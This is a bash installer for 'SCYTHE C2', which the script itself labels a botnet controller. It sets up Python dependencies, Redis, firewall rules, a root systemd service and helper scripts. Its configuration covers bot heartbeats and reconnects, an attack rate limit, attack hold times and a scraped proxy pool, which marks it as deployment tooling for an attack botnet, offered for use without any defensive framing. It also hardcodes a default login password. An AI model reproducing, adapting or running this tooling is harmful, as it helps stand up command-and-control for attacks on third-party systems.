#!/bin/bash
# ================================================================
# SCYTHE C2 - Complete Auto Installer v4.0
# One-command setup, zero manual configuration
# ================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

print_banner() {
    echo -e "${CYAN}"
    echo "  ███████╗ ██████╗██╗   ██╗████████╗██╗  ██╗███████╗"
    echo "  ██╔════╝██╔════╝╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔════╝"
    echo "  ███████╗██║      ╚████╔╝    ██║   ███████║█████╗  "
    echo "  ╚════██║██║       ╚██╔╝     ██║   ██╔══██║██╔══╝  "
    echo "  ███████║╚██████╗   ██║      ██║   ██║  ██║███████╗"
    echo "  ╚══════╝ ╚═════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚══════╝"
    echo -e "${NC}"
    echo -e "${BOLD}${GREEN}  SCYTHE C2 Complete Installer v4.0${NC}"
    echo -e "${CYAN}  ⚡ One-command setup | Zero manual config${NC}"
    echo ""
}

log_step() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} ${BOLD}$1${NC}"; }
log_ok() { echo -e "${GREEN}✅ $1${NC}"; }
log_warn() { echo -e "${YELLOW}⚠️  $1${NC}"; }
log_error() { echo -e "${RED}❌ $1${NC}"; }

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_warn "Not running as root. Some features may fail."
        read -p "Continue anyway? (y/N): " confirm
        [[ "$confirm" =~ ^[Yy]$ ]] || exit 1
    fi
}

install_system_deps() {
    log_step "Installing system dependencies..."
    if command -v apt &> /dev/null; then
        apt update -y
        apt install -y python3-venv python3-pip redis-server build-essential             libssl-dev libffi-dev nginx ufw fail2ban logrotate curl wget git
        systemctl enable redis-server
        systemctl start redis-server
    elif command -v yum &> /dev/null; then
        yum install -y python3 python3-pip redis gcc openssl-devel libffi-devel             nginx firewalld fail2ban logrotate curl wget git
        systemctl enable redis
        systemctl start redis
    fi
    log_ok "System dependencies installed"
}

setup_python() {
    log_step "Setting up Python environment..."
    if [ -d "venv" ]; then rm -rf venv; fi
    python3 -m venv venv
    source venv/bin/activate
    pip install --upgrade pip setuptools wheel

    # Install requirements
    if [ -f "requirements.txt" ]; then
        pip install -r requirements.txt
    else
        # Fallback requirements
        pip install fastapi uvicorn pydantic pydantic-settings python-dotenv             jinja2 redis aioredis sqlalchemy aiosqlite aiohttp aiohttp-socks             httpx websockets sse-starlette beautifulsoup4 lxml psutil
    fi

    # Fix aiodns/pycares conflict
    pip install aiodns==3.2.0 pycares==4.4.0

    log_ok "Python environment ready"
}

generate_env() {
    log_step "Generating .env configuration..."
    API_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
    SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")

    cat > .env <<EOF
API_PORT=1837
C2_PORT=4884
HOST=0.0.0.0
DEBUG=false
LOG_LEVEL=INFO
LOGIN_PASSWORD=scythe88
API_KEY=${API_KEY}
SECRET_KEY=${SECRET_KEY}
ALLOWED_ORIGINS=["http://localhost:1837","http://127.0.0.1:1837"]
REDIS_URL=redis://localhost:6379/0
REDIS_PASSWORD=
HISTORY_DB=sqlite:///./data/history.db
MAX_CONCURRENT=5
DEFAULT_DURATION=60
MAX_HOLD_TIME=86400
ATTACK_RPS_LIMIT=0
PROXY_REFRESH_INTERVAL=60
PROXY_HEALTH_TIMEOUT=5
PROXY_SCRAP_TIMEOUT=10
PROXY_POOL_SIZE_LIMIT=10000
HEARTBEAT_INTERVAL=10
BOT_RECONNECT_DELAY=5
LOG_FILE=./logs/scythe-c2.log
EOF
    log_ok ".env created"
}

create_dirs() {
    log_step "Creating directory structure..."
    mkdir -p logs data backups app/templates app/static
    chmod 755 logs data backups
    log_ok "Directories created"
}

copy_templates() {
    log_step "Installing HTML templates..."
    # Templates should be in the same directory as install.sh or in a templates folder
    if [ -d "templates" ]; then
        cp templates/*.html app/templates/ 2>/dev/null || true
    fi

    # Check if templates exist
    for tpl in login.html dashboard.html admin.html; do
        if [ ! -f "app/templates/$tpl" ]; then
            log_warn "$tpl not found! Creating basic version..."
            # Create minimal template if missing
            echo "<html><body><h1>SCYTHE C2 - $tpl</h1></body></html>" > "app/templates/$tpl"
        fi
    done
    log_ok "Templates installed"
}

setup_firewall() {
    log_step "Configuring firewall..."
    if command -v ufw &> /dev/null; then
        ufw default deny incoming
        ufw default allow outgoing
        ufw allow 22/tcp comment 'SSH'
        ufw allow 80/tcp comment 'HTTP'
        ufw allow 443/tcp comment 'HTTPS'
        ufw allow 1837/tcp comment 'SCYTHE API'
        ufw allow 4884/tcp comment 'SCYTHE C2 Bot'
        echo "y" | ufw enable
        log_ok "UFW configured"
    fi
}

setup_systemd() {
    log_step "Creating systemd service..."
    cat > /etc/systemd/system/scythe-c2.service <<EOF
[Unit]
Description=SCYTHE C2 Botnet Controller
After=network.target redis-server.service

[Service]
Type=simple
User=root
WorkingDirectory=$(pwd)
Environment=PATH=$(pwd)/venv/bin:/usr/local/bin:/usr/bin:/bin
EnvironmentFile=$(pwd)/.env
ExecStart=$(pwd)/venv/bin/python3 -m uvicorn app.main:app --host 0.0.0.0 --port 1837
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable scythe-c2
    log_ok "Systemd service created"
}

create_scripts() {
    log_step "Creating helper scripts..."

    # run.sh
    cat > run.sh <<'EOF'
#!/bin/bash
cd "$(dirname "$0")"
source venv/bin/activate
exec python3 -m uvicorn app.main:app --host 0.0.0.0 --port 1837 --log-level info
EOF
    chmod +x run.sh

    # stop.sh
    cat > stop.sh <<'EOF'
#!/bin/bash
pkill -f "uvicorn app.main:app" || true
systemctl stop scythe-c2 2>/dev/null || true
echo "SCYTHE C2 stopped"
EOF
    chmod +x stop.sh

    # backup.sh
    cat > backup.sh <<'EOF'
#!/bin/bash
cd "$(dirname "$0")"
mkdir -p backups
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
tar -czf "backups/scythe_backup_$TIMESTAMP.tar.gz" .env config.ini data/ logs/ app/templates/ --exclude='venv' --exclude='__pycache__' 2>/dev/null
echo "Backup: backups/scythe_backup_$TIMESTAMP.tar.gz"
EOF
    chmod +x backup.sh

    log_ok "Helper scripts created"
}

show_success() {
    echo ""
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║           ✅ SCYTHE C2 Installation Complete!               ║${NC}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}🚀 QUICK START:${NC}"
    echo ""
    echo -e "  ${YELLOW}1. Start the server:${NC}"
    echo -e "     ${GREEN}./run.sh${NC}"
    echo ""
    echo -e "  ${YELLOW}2. Or via systemd:${NC}"
    echo -e "     ${GREEN}systemctl start scythe-c2${NC}"
    echo ""
    echo -e "  ${YELLOW}3. Access dashboard:${NC}"
    echo -e "     ${CYAN}http://$(hostname -I 2>/dev/null | awk '{print $1}' || echo 'YOUR_IP'):1837${NC}"
    echo ""
    echo -e "  ${YELLOW}4. Default password:${NC} ${BOLD}scythe88${NC}"
    echo ""
    echo -e "  ${YELLOW}5. Bot config:${NC}"
    echo -e "     Edit config.ini: IP = $(hostname -I 2>/dev/null | awk '{print $1}' || echo 'YOUR_IP'), PORT = 4884"
    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}🔧 COMMANDS:${NC}"
    echo -e "  ${GREEN}./run.sh${NC}        # Start server"
    echo -e "  ${GREEN}./stop.sh${NC}       # Stop server"
    echo -e "  ${GREEN}./backup.sh${NC}     # Create backup"
    echo -e "  ${GREEN}systemctl status scythe-c2${NC}  # Check status"
    echo ""
}

# ========== MAIN ==========
print_banner
check_root
install_system_deps
setup_python
generate_env
create_dirs
copy_templates
setup_firewall
setup_systemd
create_scripts
show_success
